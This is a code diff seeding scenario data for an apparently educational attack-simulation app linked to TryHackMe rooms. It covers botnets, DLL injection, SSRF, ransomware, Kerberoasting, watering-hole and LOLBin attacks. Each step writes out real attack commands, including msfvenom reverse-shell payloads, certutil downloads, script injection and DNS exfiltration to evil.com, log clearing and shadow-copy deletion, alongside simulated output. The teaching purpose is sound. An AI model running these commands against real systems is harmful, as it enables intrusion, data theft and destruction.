+              (21,4,'Enumerate Botnet','Survey infected machines and capabilities','enumerate','botnet-cli --list-bots --sort-by bandwidth','List all active bots','800 bots online | Total bandwidth: 45 Gbps | OS: 60% Windows, 30% Linux, 10% IoT'),
+              (21,5,'Issue Commands','Send coordinated commands to all bots','command','botnet-cli --command "ddos --target victim.com --duration 1h --method syn_flood"','Issue DDoS command to botnet','DDoS launched | 800 bots flooding victim.com | 45 Gbps sustained | Target offline'),
+              (21,6,'Monetize Botnet','Rent botnet access on underground forums','monetize','tor-browser --post darknet-market.onion --listing "800-node botnet for rent: $500/hour"','List botnet for rent on dark web','Botnet listed | Price: $500/hour | 3 buyers in first 24h | Revenue: $12,000/month')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 22: DLL Injection
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('DLL Injection', 'Inject malicious DLL into a running process to execute arbitrary code',
+     'Code Injection', 'Advanced',
+     'Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20;Metasploit Introduction|https://tryhackme.com/room/metasploitintro',
+     'Volatility|https://tryhackme.com/room/volatility;Windows Forensics|https://tryhackme.com/room/introtoir'))
+    for s in [(22,1,'Identify Target Process','Find a suitable process for DLL injection','identify','tasklist /v /fi "username eq SYSTEM" | findstr svchost','Find SYSTEM-level processes','Target: svchost.exe (PID 1284) | Running as SYSTEM | Has network access'),
+              (22,2,'Create Malicious DLL','Compile DLL payload with reverse shell','create_dll','msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 -f dll -o payload.dll','Generate DLL payload with msfvenom','payload.dll created | 12KB | x64 reverse TCP meterpreter'),
+              (22,3,'Transfer DLL','Upload DLL to target machine','transfer','certutil -urlcache -split -f http://10.0.0.5/payload.dll C:\\Windows\\Temp\\payload.dll','Use certutil to download DLL','DLL transferred to C:\\Windows\\Temp\\payload.dll | LOLBin download via certutil'),
+              (22,4,'Inject into Process','Inject DLL into target process memory','inject','rundll32.exe C:\\Windows\\Temp\\payload.dll,DllMain','Execute DLL injection via rundll32','DLL injected into svchost.exe (PID 1284) | Meterpreter session opened | Running as SYSTEM'),
+              (22,5,'Establish Persistence','Set up DLL search order hijacking','persist','copy payload.dll C:\\Program Files\\VulnApp\\version.dll','Place DLL in vulnerable application path','DLL search order hijack: version.dll | Loads on every VulnApp.exe start'),
+              (22,6,'Cover Tracks','Clean injection artifacts and event logs','cover','wevtutil cl Security && wevtutil cl System && del C:\\Windows\\Temp\\payload.dll','Clear event logs and temp files','Security/System logs cleared | Temp DLL deleted | Persistence DLL remains hidden')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 23: SSRF
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Server-Side Request Forgery (SSRF)', 'Exploit SSRF to access internal services and cloud metadata from a web application',
+     'SSRF', 'Advanced',
+     'SSRF|https://tryhackme.com/room/ssrf;OWASP Top 10|https://tryhackme.com/room/owasptop10',
+     'Web App Forensics|https://tryhackme.com/room/dvwa;Log Analysis|https://tryhackme.com/room/introtologs'))
+    for s in [(23,1,'Find SSRF Vector','Identify URL parameter that makes server-side requests','find','burpsuite --proxy --target http://webapp.com/fetch?url=http://example.com','Use Burp Suite to find fetchable URL parameter','Found: /fetch?url= parameter makes server-side HTTP requests | No validation'),
+              (23,2,'Probe Internal Network','Use SSRF to scan internal services','probe','curl "http://webapp.com/fetch?url=http://127.0.0.1:8080"','Probe localhost services via SSRF','Internal service found: http://127.0.0.1:8080 (Admin panel) | Not exposed externally'),
+              (23,3,'Access Cloud Metadata','Read AWS metadata service via SSRF','metadata','curl "http://webapp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"','Query AWS metadata endpoint','IAM Role: webapp-prod-role | AccessKeyId: AKIA... | SecretAccessKey: obtained'),
+              (23,4,'Steal AWS Credentials','Extract temporary AWS access keys','steal_creds','curl "http://webapp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-prod-role"','Get full IAM credentials from metadata','AWS credentials obtained | Role: webapp-prod-role | Expiration: 6 hours | S3 full access'),
+              (23,5,'Access S3 Buckets','Use stolen creds to access private S3 storage','s3_access','aws s3 ls s3://webapp-prod-data/ --profile stolen','List S3 buckets with stolen credentials','S3 bucket: webapp-prod-data | 45,000 files | Includes: user uploads, database backups, config files'),
+              (23,6,'Exfiltrate Data','Download sensitive files from S3','exfiltrate','aws s3 cp s3://webapp-prod-data/backups/users_backup.sql . --profile stolen','Download database backup from S3','Downloaded: users_backup.sql (2.3GB) | Contains 500K user records with PII')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 24: Advanced Ransomware
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Advanced Ransomware (Double Extortion)', 'Deploy ransomware with data exfiltration for double extortion leverage',
+     'Ransomware', 'Advanced',
+     'MAL: Malware Introductory|https://tryhackme.com/room/malmalintroductory;History of Malware|https://tryhackme.com/room/historyofmalware',
+     'Volatility|https://tryhackme.com/room/volatility;YARA|https://tryhackme.com/room/yara'))
+    for s in [(24,1,'Initial Access via RDP','Brute force exposed RDP service','rdp_brute','hydra -l administrator -P rockyou.txt rdp://target-corp.com','Use Hydra to brute force RDP','RDP credentials found: administrator:Winter2024! | Direct access to file server'),
+              (24,2,'Disable Security','Kill antivirus and EDR processes','disable_av','powershell -ep bypass -c "Get-Service -Name *defender* | Stop-Service -Force"','Disable Windows Defender via PowerShell','Defender disabled | Real-time protection OFF | Tamper protection bypassed'),
+              (24,3,'Exfiltrate First','Steal data before encryption for leverage','exfil_first','rclone copy C:\\SensitiveData remote:exfil-bucket --transfers 16','Use rclone to exfiltrate data before encrypting','Exfiltrated: 450GB | Contracts, financials, customer PII, trade secrets'),
+              (24,4,'Deploy Ransomware','Execute encryption across all shares','encrypt','ransomware.exe --encrypt-all --extension .locked --exclude C:\\Windows','Run ransomware with exclusions','Encrypting... 125,000 files across 12 network shares | AES-256 + RSA-2048'),
+              (24,5,'Delete Backups','Destroy backup copies and shadow volumes','delete_backups','vssadmin delete shadows /all /quiet && wbadmin delete catalog -quiet','Delete volume shadow copies','Shadow copies deleted | Backup catalog destroyed | 3 backup servers wiped'),
+              (24,6,'Ransom Note','Deploy double extortion ransom demand','ransom','echo "Pay 50 BTC or we leak 450GB of your data on our blog" > README_LOCKED.txt','Create ransom note with leak threat','Ransom: 50 BTC ($2.1M) | Deadline: 7 days | Leak site: darkblog.onion | Timer started')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 25: Kerberoasting
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Kerberoasting', 'Extract and crack Kerberos service tickets to compromise Active Directory service accounts',
+     'Active Directory', 'Advanced',
+     'Active Directory|https://tryhackme.com/room/attacktivedirectory;Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20',
+     'Windows Forensics|https://tryhackme.com/room/introtoir;Incident Response|https://tryhackme.com/room/introtoir'))
+    for s in [(25,1,'Domain Enumeration','Enumerate Active Directory for service accounts','enum_ad','bloodhound-python -c all -d corp.local -u jsmith -p Password1','Run BloodHound collector','AD enumerated: 2,500 users | 45 groups | 12 service accounts with SPNs'),
+              (25,2,'Find SPNs','Identify service accounts with Service Principal Names','find_spn','GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip 10.0.0.10','Use Impacket to find SPNs','SPNs found: svc_sql (MSSQLSvc), svc_web (HTTP), svc_backup (CIFS) | All crackable'),
+              (25,3,'Request Tickets','Request TGS tickets for service accounts','request_tgs','GetUserSPNs.py corp.local/jsmith:Password1 -dc-ip 10.0.0.10 -request','Request TGS tickets for cracking','3 TGS tickets exported | Encryption: RC4_HMAC (weak) | Ready for offline cracking'),
+              (25,4,'Crack Tickets','Offline crack the Kerberos tickets','crack_tgs','hashcat -m 13100 tgs_tickets.txt rockyou.txt --force','Crack TGS with hashcat mode 13100','svc_sql cracked: SqlAdmin2024! | svc_backup cracked: Backup123 | 2/3 cracked'),
+              (25,5,'Lateral Movement','Use cracked service account for domain escalation','lateral','psexec.py corp.local/svc_sql:SqlAdmin2024!@10.0.0.30','Use psexec with cracked service account','SYSTEM shell on SQL Server | svc_sql has local admin on 5 servers'),
+              (25,6,'Domain Dominance','Dump domain controller secrets','domain_dump','secretsdump.py corp.local/svc_sql:SqlAdmin2024!@10.0.0.10','Dump DC secrets with secretsdump','NTDS.dit extracted | 2,500 user hashes | krbtgt hash obtained | Full domain compromise')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 26: Physical Device Cloning
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Physical Device Cloning', 'Clone a physical device to extract credentials and access sensitive data',
+     'Physical Attack', 'Advanced',
+     'Linux PrivEsc|https://tryhackme.com/room/linprivesc;Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics',
+     'Disk Forensics|https://tryhackme.com/room/dvwa;Autopsy|https://tryhackme.com/room/dvwa'))
+    for s in [(26,1,'Create Disk Image','Clone target hard drive bit-for-bit','clone','dd if=/dev/sda of=/mnt/external/clone.img bs=4M status=progress','Use dd to create disk image','Cloning /dev/sda: 500GB | Speed: 150MB/s | SHA256 hash recorded for integrity'),
+              (26,2,'Mount Image','Mount cloned image for analysis','mount','losetup -fP /mnt/external/clone.img && mount /dev/loop0p2 /mnt/analysis','Mount disk image with losetup','Image mounted at /mnt/analysis | Filesystem: NTFS | OS: Windows 10 Pro'),
+              (26,3,'Extract Credentials','Pull stored credentials from the cloned system','extract_creds','secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL','Extract SAM database credentials','5 local accounts found | Administrator NTLM hash extracted | 2 cached domain creds'),
+              (26,4,'Recover Deleted Files','Recover deleted sensitive documents','recover','photorec /mnt/external/clone.img','Use PhotoRec to recover deleted files','Recovered: 2,400 files | Includes: deleted emails, financial spreadsheets, SSH keys'),
+              (26,5,'Browser Data Extraction','Extract saved passwords and cookies from browsers','browser','python3 lazagne.py all -oJ','Use LaZagne to extract browser credentials','Chrome: 45 saved passwords | Firefox: 12 passwords | Edge: 8 passwords | 3 banking sites'),
+              (26,6,'WiFi Password Recovery','Extract stored WiFi passwords from the clone','wifi','netsh wlan show profiles | foreach {netsh wlan show profile name=$_ key=clear}','Extract WiFi profiles and keys','8 WiFi profiles found | Corporate WPA2 key: C0rp_S3cur3! | Home network key recovered')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 27: Watering Hole Attack
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Watering Hole Attack', 'Compromise a website frequently visited by the target group to deliver malware',
+     'APT', 'Advanced',
+     'OWASP Top 10|https://tryhackme.com/room/owasptop10;XSS|https://tryhackme.com/room/xss',
+     'Web App Forensics|https://tryhackme.com/room/dvwa;Incident Response|https://tryhackme.com/room/introtoir'))
+    for s in [(27,1,'Profile Target Group','Research target organizations browsing habits','profile','maltego --target "DefenseCorp" --transform web_history','Profile target group web usage','Target: DefenseCorp employees | Frequently visit: industry-news.com (85% of staff)'),
+              (27,2,'Compromise Watering Hole','Exploit vulnerability in the target website','compromise','sqlmap -u "http://industry-news.com/article?id=1" --os-shell','SQLi to get shell on news site','Shell on industry-news.com | Web root access | Can inject JavaScript into pages'),
+              (27,3,'Inject Exploit Kit','Embed exploit code in popular article pages','inject','echo "<script src=http://evil.com/exploit.js></script>" >> /var/www/article_template.php','Inject exploit script into template','Exploit kit injected | Targets: Chrome<120, Firefox<115 | 2,000 daily visitors'),
+              (27,4,'Serve Payload','Zero-day browser exploit delivers backdoor','serve','python3 exploit_server.py --payload backdoor.exe --cve CVE-2024-XXXX','Start exploit server for drive-by download','Drive-by download active | 12 DefenseCorp IPs infected in first 48 hours'),
+              (27,5,'Establish C2','Connect backdoors to command and control','c2_connect','covenant --listeners add --name watering --port 443 --ssl','Setup Covenant C2 listener','12 beacons connected | All DefenseCorp network | Including 2 admin workstations'),
+              (27,6,'Espionage Operations','Conduct intelligence gathering on target org','espionage','covenant --interact beacon01 --command "download C:\\Projects\\classified\\"','Download classified files via C2','Exfiltrated: 3.2GB classified documents | Project blueprints | Internal communications')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 28: Advanced Insider Attack
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Advanced Insider Attack', 'Sophisticated insider leverages deep system knowledge to exfiltrate data undetected',
+     'Insider Threat', 'Advanced',
+     'Linux PrivEsc|https://tryhackme.com/room/linprivesc;Intro to Digital Forensics|https://tryhackme.com/room/introdigitalforensics',
+     'Disk Forensics|https://tryhackme.com/room/dvwa;Incident Response|https://tryhackme.com/room/introtoir'))
+    for s in [(28,1,'Abuse Admin Access','Use authorized admin access to query sensitive databases','abuse','psql -h prod-db.internal -U db_admin -c "SELECT * FROM customers WHERE balance > 100000"','Query high-value customer records','Queried 847 high-value customer records | Total value: $2.1B in assets'),
+              (28,2,'Steganography Hide','Hide stolen data inside image files','stego','steghide embed -cf vacation.jpg -ef customers.csv -p s3cret','Use steghide to hide CSV in images','Data hidden in 15 vacation photos | 847 records embedded | Undetectable by DLP'),
+              (28,3,'Exfil via Email','Send data out disguised as personal photos','email_exfil','sendmail --to personal@gmail.com --attach vacation_photos.zip --subject "My vacation pics"','Email the steganographic images','Emailed 15 images to personal account | DLP scan: PASSED (no sensitive data detected)'),
+              (28,4,'Encrypt Evidence','Encrypt local copies with plausible deniability','encrypt','veracrypt --create hidden_volume --size 500MB --encryption AES-Twofish','Create VeraCrypt hidden volume','Hidden volume created | Outer volume: personal docs | Hidden: stolen customer data'),
+              (28,5,'Plant False Trail','Create misleading audit log entries','false_trail','psql -h prod-db.internal -U db_admin -c "UPDATE audit_log SET query=\'routine maintenance check\'"','Modify audit logs to hide queries','Audit logs modified | Original queries replaced with routine maintenance entries'),
+              (28,6,'Sell on Dark Web','Monetize stolen data anonymously','sell','tor-browser --post darkmarket.onion --listing "847 HNW client records - $200K"','Post data for sale on dark web','Listed on 3 dark web markets | Price: $200K in Monero | First buyer within 6 hours')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 29: Zero-Day Exploits
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Zero-Day Exploits', 'Discover and weaponize an unknown vulnerability before any patch exists',
+     'Zero-Day', 'Advanced',
+     'Metasploit Introduction|https://tryhackme.com/room/metasploitintro;OWASP Top 10|https://tryhackme.com/room/owasptop10',
+     'REMnux|https://tryhackme.com/room/yourfirstmalwareanalysis;YARA|https://tryhackme.com/room/yara'))
+    for s in [(29,1,'Fuzzing','Fuzz target application to find crashes','fuzz','afl-fuzz -i input_corpus -o crash_output -- ./target_app @@','Fuzz with AFL to find crashes','AFL ran 48h | 12,847 paths | 3 unique crashes found | 1 exploitable (heap overflow)'),
+              (29,2,'Analyze Crash','Reverse engineer the crash for exploitability','analyze','gdb ./target_app core_dump -ex "bt full" -ex "info registers"','Analyze crash with GDB','Heap buffer overflow at 0x7fff... | Controllable EIP | Write-what-where primitive'),
+              (29,3,'Develop Exploit','Write reliable exploit with ROP chain','develop','ropper --file target_app --search "pop rdi; ret"','Find ROP gadgets with Ropper','ROP chain built | 12 gadgets | Bypasses: ASLR, NX, Stack Canary | 95% reliability'),
+              (29,4,'Weaponize','Package exploit with payload for deployment','weaponize','msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 -f elf -o exploit_payload','Create weaponized payload','Zero-day exploit packaged | CVE: PENDING | Affects versions 3.0-3.8 | No patch available'),
+              (29,5,'Deploy Against Target','Use zero-day against high-value target','deploy','python3 zero_day_exploit.py --target 10.0.0.100 --payload exploit_payload','Run zero-day exploit against target','Zero-day deployed | Shell obtained on 10.0.0.100 | IDS/WAF: No detection | AV: No signature'),
+              (29,6,'Maintain Access','Install persistent access before patch release','maintain','python3 implant.py --install --stealth --callback-interval 3600','Install stealthy implant','Implant installed | Memory-only (fileless) | Callbacks every hour | Survives patching')]:
+        cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
+
+    # ==========================================
+    # SCENARIO 30: Living Off the Land
+    # ==========================================
+    cursor.execute('''INSERT INTO scenarios (name, description, attack_type, difficulty, tryhackme_rooms, forensics_rooms)
+    VALUES (?, ?, ?, ?, ?, ?)''',
+    ('Living Off the Land (LOLBins)', 'Use legitimate system tools to attack without deploying malware',
+     'Evasion', 'Advanced',
+     'Windows PrivEsc|https://tryhackme.com/room/windowsprivesc20;Active Directory|https://tryhackme.com/room/attacktivedirectory',
+     'Windows Forensics|https://tryhackme.com/room/introtoir;Volatility|https://tryhackme.com/room/volatility'))
+    for s in [(30,1,'Recon with Built-ins','Use native Windows tools for reconnaissance','recon','powershell -c "Get-ADComputer -Filter * | Select Name,OperatingSystem"','Use PowerShell AD cmdlets for recon','Domain: 450 computers | 12 servers | 5 DCs | 2,500 users | All via legitimate tools'),
+              (30,2,'Download via Certutil','Use certutil to download tools (LOLBin)','lolbin_download','certutil -urlcache -split -f http://10.0.0.5/nc.exe C:\\Windows\\Temp\\svc.exe','Use certutil as download cradle','nc.exe downloaded as svc.exe | Certutil is trusted by AV | No detection triggered'),
+              (30,3,'Execute via WMIC','Run payload using WMIC process call','wmic_exec','wmic process call create "C:\\Windows\\Temp\\svc.exe -e cmd.exe 10.0.0.5 4444"','Execute payload using WMIC','Reverse shell via WMIC | Process tree: wmiprvse.exe > svc.exe | Appears legitimate'),
+              (30,4,'Persist via Scheduled Tasks','Create persistence using schtasks','schtask_persist','schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\svc.exe" /sc onstart /ru SYSTEM','Create scheduled task for persistence','Task WindowsUpdate created | Runs as SYSTEM on boot | Blends with real update tasks'),
+              (30,5,'Lateral Move via PSExec','Spread using Windows built-in remote execution','psexec_move','psexec \\\\fileserver cmd /c "certutil -urlcache -f http://10.0.0.5/svc.exe C:\\Windows\\Temp\\svc.exe"','Use PsExec to spread laterally','Spread to FILESERVER | Payload deployed via certutil chain | 0 AV alerts'),
+              (30,6,'Exfil via DNS','Exfiltrate data through DNS queries (LOLBin)','dns_exfil','powershell -c "Get-Content secrets.txt | ForEach {nslookup $_.base64.evil.com}"','Use nslookup for DNS exfiltration','450KB exfiltrated via DNS queries | 2,300 lookups to evil.com | Firewall: allowed (port 53)')]:
         cursor.execute('INSERT INTO attack_steps (scenario_id, step_number, title, description, action, command, command_hint, log_entry) VALUES (?,?,?,?,?,?,?,?)', s)
 
     # ==========================================
@@ -1345,6 +1721,215 @@ def get_network_map(scenario_id):
         'edges': [{'from':'attacker','to':'registry'},{'from':'attacker','to':'package'},{'from':'registry','to':'ci'},
                   {'from':'package','to':'dev'},{'from':'ci','to':'enterprise'},{'from':'dev','to':'enterprise'},
                   {'from':'enterprise','to':'aws'}]}
+    # Scenario 9: XSS
+    maps[9] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'webapp','label':'Web App','type':'server','x':250,'y':200},
+        {'id':'comment','label':'Comment Section','type':'malicious','x':250,'y':350},
+        {'id':'victim','label':'Victim Browser','type':'workstation','x':450,'y':200},
+        {'id':'cookie','label':'Cookie Stealer','type':'malicious','x':450,'y':350},
+        {'id':'admin','label':'Admin Panel','type':'server','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'webapp'},{'from':'attacker','to':'comment'},{'from':'victim','to':'comment'},
+                  {'from':'victim','to':'cookie'},{'from':'cookie','to':'attacker'},{'from':'attacker','to':'admin'}]}
+    # Scenario 10: Rogue AP
+    maps[10] = {'nodes': [
+        {'id':'attacker','label':'Rogue AP','type':'attacker','x':200,'y':50},
+        {'id':'legit','label':'Real WiFi','type':'router','x':500,'y':50},
+        {'id':'v1','label':'Client 1','type':'workstation','x':100,'y':250},
+        {'id':'v2','label':'Client 2','type':'workstation','x':300,'y':250},
+        {'id':'v3','label':'Client 3','type':'workstation','x':500,'y':250},
+        {'id':'proxy','label':'HTTP Proxy','type':'malicious','x':200,'y':350}],
+        'edges': [{'from':'v1','to':'attacker'},{'from':'v2','to':'attacker'},{'from':'v3','to':'legit'},
+                  {'from':'attacker','to':'proxy'},{'from':'proxy','to':'legit'}]}
+    # Scenario 11: Rainbow Table
+    maps[11] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'db','label':'Breached DB','type':'database','x':250,'y':200},
+        {'id':'rainbow','label':'Rainbow Tables','type':'malicious','x':450,'y':100},
+        {'id':'hashcat','label':'Hashcat','type':'malicious','x':450,'y':300},
+        {'id':'creds','label':'Cracked Creds','type':'server','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'db'},{'from':'db','to':'rainbow'},{'from':'db','to':'hashcat'},
+                  {'from':'rainbow','to':'creds'},{'from':'hashcat','to':'creds'}]}
+    # Scenario 12: Social Engineering
+    maps[12] = {'nodes': [
+        {'id':'attacker','label':'Social Engineer','type':'attacker','x':50,'y':200},
+        {'id':'osint','label':'OSINT/LinkedIn','type':'cloud','x':250,'y':80},
+        {'id':'phone','label':'Vishing Call','type':'malicious','x':250,'y':320},
+        {'id':'victim','label':'IT Admin','type':'workstation','x':450,'y':200},
+        {'id':'vpn','label':'Corporate VPN','type':'server','x':650,'y':130},
+        {'id':'files','label':'File Server','type':'server','x':650,'y':280}],
+        'edges': [{'from':'attacker','to':'osint'},{'from':'attacker','to':'phone'},{'from':'phone','to':'victim'},
+                  {'from':'victim','to':'vpn'},{'from':'vpn','to':'files'}]}
+    # Scenario 13: Cryptojacking
+    maps[13] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'s1','label':'Server 1','type':'server','x':250,'y':100},
+        {'id':'s2','label':'Server 2','type':'server','x':250,'y':300},
+        {'id':'miner','label':'XMRig Miner','type':'malicious','x':450,'y':200},
+        {'id':'pool','label':'Mining Pool','type':'cloud','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'s1'},{'from':'attacker','to':'s2'},{'from':'s1','to':'miner'},
+                  {'from':'s2','to':'miner'},{'from':'miner','to':'pool'}]}
+    # Scenario 14: Backdoor
+    maps[14] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'vuln','label':'Vuln Service','type':'server','x':250,'y':200},
+        {'id':'backdoor','label':'Backdoor','type':'malicious','x':450,'y':120},
+        {'id':'ssh','label':'SSH Key','type':'malicious','x':450,'y':280},
+        {'id':'rootshell','label':'Root Shell','type':'server','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'vuln'},{'from':'vuln','to':'backdoor'},{'from':'vuln','to':'ssh'},
+                  {'from':'backdoor','to':'rootshell'},{'from':'ssh','to':'rootshell'}]}
+    # Scenario 15: Privilege Escalation
+    maps[15] = {'nodes': [
+        {'id':'lowuser','label':'Low-Priv User','type':'workstation','x':50,'y':200},
+        {'id':'linpeas','label':'LinPEAS Scan','type':'malicious','x':230,'y':120},
+        {'id':'suid','label':'SUID Binary','type':'server','x':230,'y':300},
+        {'id':'root','label':'Root Shell','type':'attacker','x':450,'y':200},
+        {'id':'shadow','label':'/etc/shadow','type':'database','x':650,'y':200}],
+        'edges': [{'from':'lowuser','to':'linpeas'},{'from':'lowuser','to':'suid'},{'from':'suid','to':'root'},
+                  {'from':'root','to':'shadow'}]}
+    # Scenario 16: Session Hijacking
+    maps[16] = {'nodes': [
+        {'id':'attacker','label':'Sniffer','type':'attacker','x':350,'y':50},
+        {'id':'network','label':'Shared Network','type':'router','x':350,'y':200},
+        {'id':'victim','label':'Admin User','type':'workstation','x':150,'y':350},
+        {'id':'webapp','label':'Web App','type':'server','x':550,'y':350},
+        {'id':'cookie','label':'Session Token','type':'malicious','x':550,'y':130}],
+        'edges': [{'from':'victim','to':'network'},{'from':'network','to':'webapp'},{'from':'attacker','to':'network'},
+                  {'from':'network','to':'cookie'},{'from':'cookie','to':'attacker'}]}
+    # Scenario 17: Spyware
+    maps[17] = {'nodes': [
+        {'id':'attacker','label':'Attacker C2','type':'attacker','x':50,'y':200},
+        {'id':'email','label':'Phishing Email','type':'malicious','x':250,'y':100},
+        {'id':'victim','label':'Victim PC','type':'workstation','x':450,'y':200},
+        {'id':'keylog','label':'Keylogger','type':'malicious','x':250,'y':300},
+        {'id':'data','label':'Exfil Server','type':'server','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'email'},{'from':'email','to':'victim'},{'from':'victim','to':'keylog'},
+                  {'from':'keylog','to':'data'},{'from':'data','to':'attacker'}]}
+    # Scenario 18: Evil Twin
+    maps[18] = {'nodes': [
+        {'id':'attacker','label':'Evil Twin AP','type':'attacker','x':200,'y':50},
+        {'id':'legit','label':'Legit AP','type':'router','x':500,'y':50},
+        {'id':'captive','label':'Captive Portal','type':'malicious','x':200,'y':250},
+        {'id':'v1','label':'Victim 1','type':'workstation','x':350,'y':350},
+        {'id':'v2','label':'Victim 2','type':'workstation','x':500,'y':250},
+        {'id':'internal','label':'Corp Network','type':'server','x':650,'y':150}],
+        'edges': [{'from':'attacker','to':'captive'},{'from':'v1','to':'attacker'},{'from':'v2','to':'legit'},
+                  {'from':'captive','to':'attacker'},{'from':'attacker','to':'internal'}]}
+    # Scenario 19: Handshake Capture
+    maps[19] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'monitor','label':'Monitor Mode','type':'malicious','x':220,'y':100},
+        {'id':'ap','label':'Target AP','type':'router','x':400,'y':100},
+        {'id':'client','label':'WiFi Client','type':'workstation','x':400,'y':300},
+        {'id':'handshake','label':'4-Way Handshake','type':'database','x':220,'y':300},
+        {'id':'cracked','label':'Cracked Key','type':'server','x':600,'y':200}],
+        'edges': [{'from':'attacker','to':'monitor'},{'from':'monitor','to':'ap'},{'from':'ap','to':'client'},
+                  {'from':'client','to':'handshake'},{'from':'handshake','to':'cracked'}]}
+    # Scenario 20: Pass the Hash
+    maps[20] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'ws','label':'Workstation','type':'workstation','x':230,'y':200},
+        {'id':'mimikatz','label':'Mimikatz','type':'malicious','x':230,'y':350},
+        {'id':'dc','label':'Domain Controller','type':'server','x':450,'y':130},
+        {'id':'fs','label':'File Server','type':'server','x':450,'y':280},
+        {'id':'golden','label':'Golden Ticket','type':'malicious','x':650,'y':200}],
+        'edges': [{'from':'attacker','to':'ws'},{'from':'ws','to':'mimikatz'},{'from':'mimikatz','to':'dc'},
+                  {'from':'mimikatz','to':'fs'},{'from':'dc','to':'golden'}]}
+    # Scenario 21: Botnets
+    maps[21] = {'nodes': [
+        {'id':'c2','label':'C2 Server','type':'attacker','x':350,'y':50},
+        {'id':'b1','label':'Bot 1','type':'malicious','x':100,'y':200},
+        {'id':'b2','label':'Bot 2','type':'malicious','x':250,'y':200},
+        {'id':'b3','label':'Bot 3','type':'malicious','x':400,'y':200},
+        {'id':'b4','label':'Bot 4','type':'malicious','x':550,'y':200},
+        {'id':'target','label':'DDoS Target','type':'server','x':350,'y':350}],
+        'edges': [{'from':'c2','to':'b1'},{'from':'c2','to':'b2'},{'from':'c2','to':'b3'},{'from':'c2','to':'b4'},
+                  {'from':'b1','to':'target'},{'from':'b2','to':'target'},{'from':'b3','to':'target'},{'from':'b4','to':'target'}]}
+    # Scenario 22: DLL Injection
+    maps[22] = {'nodes': [
+        {'id':'attacker','label':'Attacker','type':'attacker','x':50,'y':200},
+        {'id':'payload','label':'Malicious DLL','type':'malicious','x':250,'y':120},
+        {'id':'process','label':'svchost.exe','type':'server','x':450,'y':200},
